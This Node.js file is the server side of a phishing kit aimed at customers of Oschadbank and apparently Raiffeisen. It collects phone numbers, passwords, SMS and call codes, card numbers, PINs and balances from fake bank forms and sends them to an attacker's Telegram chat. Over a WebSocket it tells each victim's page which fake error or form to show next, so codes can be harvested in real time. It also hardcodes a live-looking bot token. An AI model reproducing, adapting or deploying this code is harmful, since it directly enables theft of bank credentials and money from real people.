const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const cors = require('cors');
const app = express();

// --- Конфигурация ---
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || null;

// --- Инициализация Telegram Bot ---
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

// Проверка и установка вебхука или включение polling
if (WEBHOOK_URL) {
    bot.setWebHook(`${WEBHOOK_URL}/bot${TELEGRAM_BOT_TOKEN}`)
        .then(() => console.log(`Webhook set to ${WEBHOOK_URL}/bot${TELEGRAM_BOT_TOKEN}`))
        .catch(err => console.error('Error setting webhook:', err.message));
} else {
    console.warn('ВНИМАНИЕ: RENDER_EXTERNAL_URL не определена. Вебхук для Telegram не установлен.');
    bot.startPolling({ polling: true })
        .then(() => console.log('Polling mode enabled for Telegram bot'))
        .catch(err => console.error('Error enabling polling:', err.message));
}

// --- Инициализация Express и WebSocket ---
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
const wss = new WebSocket.Server({ server });
const clients = new Map();

// --- WebSocket: Обработка подключений ---
wss.on('connection', ws => {
    ws.on('message', message => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register') {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });

    ws.on('close', () => {
        for (const [sessionId, client] of clients) {
            if (client === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
                break;
            }
        }
    });

    ws.on('error', error => console.error('WebSocket error:', error));
});

// --- Обработка Telegram команд ---
bot.onText(/\/start/, msg => {
    bot.sendMessage(msg.chat.id, 'Бот запущен! Используйте /ban <sessionId> для блокировки пользователя.')
        .catch(err => console.error('Error sending /start response:', err.message));
});

bot.onText(/\/ban (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const sessionId = match[1];
    const ws = clients.get(sessionId);
    if (ws) {
        ws.send(JSON.stringify({ type: 'ban' }));
        ws.close();
        clients.delete(sessionId);
        console.log(`User banned: ${sessionId}`);
        bot.sendMessage(CHAT_ID, `Пользователь ${sessionId} заблокирован.`)
            .catch(err => console.error('Error sending ban confirmation:', err.message));
    } else {
        bot.sendMessage(CHAT_ID, `Пользователь с sessionId ${sessionId} не найден.`)
            .catch(err => console.error('Error sending ban error message:', err.message));
    }
});

// --- API: Обработка данных от клиента ---
app.post('/api/submit', async (req, res) => {
    console.log('Received /api/submit request:', req.body);
    const { sessionId, bankName, isFinalStep, referrer, ...stepData } = req.body;
    const ws = clients.get(sessionId);

    if (!ws) {
        console.error(`[${sessionId}] WebSocket client not found`);
        return res.status(400).json({ error: 'Client not found' });
    }

    try {
        let message = `<b>Сессия:</b> ${sessionId}\n<b>Банк:</b> ${bankName}\n<b>Реферер:</b> ${referrer}\n`;
        Object.entries(stepData).forEach(([key, value]) => {
            message += `<b>${key}:</b> ${value}\n`;
        });

        const keyboard = isFinalStep ? {
            inline_keyboard: [[{ text: 'Заблокировать', callback_data: `ban_${sessionId}` }]]
        } : null;

        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: keyboard })
            .then(() => console.log(`[${sessionId}] Message sent to Telegram: ${message}`))
            .catch(err => {
                console.error(`[${sessionId}] Telegram send error:`, err.message, err.response?.data);
                bot.sendMessage(CHAT_ID, `⚠️ Ошибка отправки данных для сессии ${sessionId}: ${err.message}`)
                    .catch(secondaryErr => console.error('Failed to send error message to Telegram:', secondaryErr));
            });

        // Логика обработки данных
        if (stepData.phone && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'lk' }));
        } else if (stepData.password && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'password_error', data: { loginType: req.body.loginMethod || 'phone' } }));
        } else if (stepData.fp_phone && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'call' }));
        } else if (stepData.call_code && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'code_error' }));
        } else if (stepData.sms_code && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'telegram_debit' }));
        } else if (stepData.debit_sms_code && bankName === 'Ощадбанк') {
            ws.send(JSON.stringify({ type: 'other' }));
        } else if (stepData.phone) {
            ws.send(JSON.stringify({ type: 'show_debit_form' }));
        } else if (stepData.sms_code) {
            ws.send(JSON.stringify({ type: 'raiff_code_error' }));
        } else if (stepData.debit_sms_code) {
            ws.send(JSON.stringify({ type: 'generic_debit_error' }));
        } else if (stepData.card) {
            ws.send(JSON.stringify({ type: 'show_request_details_form' }));
        } else if (stepData.card_balance) {
            ws.send(JSON.stringify({ type: 'other' }));
        } else if (stepData.pin) {
            ws.send(JSON.stringify({ type: 'raiff_pin_error' }));
        }

        res.json({ status: 'ok' });
    } catch (error) {
        console.error(`[${sessionId}] Error processing /api/submit:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// --- Обработка Telegram callback'ов ---
bot.on('callback_query', async query => {
    const [action, sessionId] = query.data.split('_');
    if (action === 'ban') {
        const ws = clients.get(sessionId);
        if (ws) {
            ws.send(JSON.stringify({ type: 'ban' }));
            ws.close();
            clients.delete(sessionId);
            console.log(`User banned via callback: ${sessionId}`);
            await bot.sendMessage(CHAT_ID, `Пользователь ${sessionId} заблокирован.`)
                .catch(err => console.error('Error sending ban confirmation:', err.message));
        } else {
            await bot.sendMessage(CHAT_ID, `Пользователь с sessionId ${sessionId} не найден.`)
                .catch(err => console.error('Error sending ban error message:', err.message));
        }
        await bot.answerCallbackQuery(query.id);
    }
});

// --- Обработка Telegram webhook'ов ---
app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});
